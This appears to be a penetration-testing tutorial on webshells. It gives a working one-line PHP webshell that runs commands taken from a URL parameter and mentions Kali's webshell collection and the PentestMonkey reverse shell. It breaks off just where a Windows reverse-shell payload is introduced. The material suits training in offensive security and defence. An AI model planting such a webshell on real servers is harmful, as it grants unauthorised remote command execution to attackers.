Webshell is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.
# Useful Commands

As PHP is still the most common server side scripting language, let's have a look at some simple code for this.

we can upload this to a server as a php file in a very basic one line format:

```bash
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Essentially, what this means is that any commands we enter in the URL after `?cmd=` will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.

Lets try to inject `ifconfig` command for example like this:

There are a variety of webshells available on Kali by default at `/usr/share/webshells` -- including the infamous [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) -- a full reverse shell written in PHP. Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.

If the target is windows we can use this payload to inject in the URL to get a reverse shell, note that we must change the ip and the port to the attacker machine values:
